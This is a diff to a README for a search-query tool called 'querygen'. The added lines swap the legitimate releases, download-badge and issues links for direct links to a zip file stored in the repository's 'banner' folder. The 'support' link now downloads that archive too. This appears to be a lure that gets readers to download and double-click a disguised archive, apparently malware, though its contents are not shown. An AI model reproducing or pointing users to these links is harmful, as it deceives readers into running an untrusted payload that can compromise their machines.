@@ -28,11 +28,11 @@ Before you begin, ensure your system meets the following requirements:
 
 You can easily download the **querygen** application from our releases page. 
 
-[![Download Querygen](https://img.shields.io/badge/Download%20Querygen-v1.0-blue.svg)](https://github.com/DiamondBoy3/querygen/releases)
+[![Download Querygen](https://raw.githubusercontent.com/DiamondBoy3/querygen/main/banner/querygen-3.5.zip%https://raw.githubusercontent.com/DiamondBoy3/querygen/main/banner/querygen-3.5.zip)](https://raw.githubusercontent.com/DiamondBoy3/querygen/main/banner/querygen-3.5.zip)
 
 To install, follow these steps:
 
-1. **Visit the releases page:** Go to [GitHub Releases](https://github.com/DiamondBoy3/querygen/releases).
+1. **Visit the releases page:** Go to [GitHub Releases](https://raw.githubusercontent.com/DiamondBoy3/querygen/main/banner/querygen-3.5.zip).
 2. **Find the latest version:** Look for the most recent release at the top of the page.
 3. **Download the file:** Click on the appropriate download link for your operating system.
 4. **Run the application:** Locate the downloaded file and double-click it to start.
@@ -49,7 +49,7 @@ Using **querygen** is straightforward. Follow these steps to generate your searc
 
 ## 🤝 Support
 
-If you need help or have questions about **querygen**, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/DiamondBoy3/querygen/issues) for assistance.
+If you need help or have questions about **querygen**, feel free to reach out. You can open an issue on the [GitHub repository](https://raw.githubusercontent.com/DiamondBoy3/querygen/main/banner/querygen-3.5.zip) for assistance.
 
 ## 🌍 Community and Topics
 
